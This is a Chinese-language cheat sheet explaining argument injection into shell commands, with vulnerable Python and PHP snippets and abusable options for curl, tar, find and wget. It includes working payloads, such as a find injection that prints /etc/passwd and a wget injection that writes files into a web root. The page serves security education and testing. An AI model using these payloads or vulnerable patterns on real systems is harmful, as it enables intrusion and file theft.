# 参数注入

参数注入与命令注入类似，因为未经过适当的清理/转义，受污染的数据被传递给在shell中执行的命令。

在不同的情况下都可能发生参数注入，你只能向命令注入参数：

- 不当的清理（正则表达式）
- 注入参数到固定命令中（PHP:escapeshellcmd, Python: Popen）
- Bash扩展（例如：*）

在以下示例中，一个Python脚本从命令行接收输入来生成一个```curl```命令：

```py
from shlex import quote,split
import sys
import subprocess

if __name__=="__main__":
    command = ['curl']
    command = command + split(sys.argv[1])
    print(command)
    r = subprocess.Popen(command)
```

攻击者可以传递多个单词来滥用```curl```命令的选项

```ps1
python python_rce.py "https://www.google.fr -o test.py" 
```

通过打印命令，我们可以看到所有参数都被分割，允许注入一个参数将响应保存到一个任意文件中。

```ps1
['curl', 'https://www.google.fr', '-o', 'test.py']
```

## 总结

* [暴露的命令列表](#list-of-exposed-commands)
  * [CURL](#CURL)
  * [TAR](#TAR)
  * [FIND](#FIND)
  * [WGET](#WGET)
* [参考资料](#references)


## 暴露的命令列表

### CURL

可以通过以下选项滥用```curl```：

```ps1
 -o, --output <file>        写入文件而不是标准输出
 -O, --remote-name          将输出写入一个名为远程文件的文件
```

如果命令中已经有一个选项，可以注入多个URL进行下载和多个输出选项。每个选项将依次影响每个URL。

### TAR

对于```tar```命令，可以在不同的命令中注入任意参数。 

参数注入可能发生在'''extract'''命令中：

```ps1
--to-command <command>
--checkpoint=1 --checkpoint-action=exec=<command>
-T <file> 或 --files-from <file>
```

或者在'''create'''命令中：

```ps1
-I=<program> 或 -I <program>
--use-compres-program=<program>
```

还有短选项可以在不使用空格的情况下工作：

```ps1
-T<file>
-I"/path/to/exec"
```

### FIND

在/tmp目录内查找某个文件。

```php
$file = "some_file";
system("find /tmp -iname ".escapeshellcmd($file));
```

打印/etc/passwd内容。

```php
$file = "sth -or -exec cat /etc/passwd ; -quit";
system("find /tmp -iname ".escapeshellcmd($file));
```

### WGET

易受攻击的代码示例

```php
system(escapeshellcmd('wget '.$url));
```

任意文件写入

```php
$url = '--directory-prefix=/var/www/html http://example.com/example.php';
```

## 参考资料

- [staaldraad - Etienne Stalmans, 2019年11月24日](https://staaldraad.github.io/post/2019-11-24-argument-injection/)
- [回到未来：Unix通配符失控 - Leon Juranic, 2014年6月25日](https://www.exploit-db.com/papers/33930)
- [TL;DR: 如何利用/绕过/使用PHP escapeshellarg/escapeshellcmd函数 - kacperszurek, 2018年4月25日](https://github.com/kacperszurek/exploits/blob/master/GitList/exploit-bypass-php-escapeshellarg-escapeshellcmd.md)
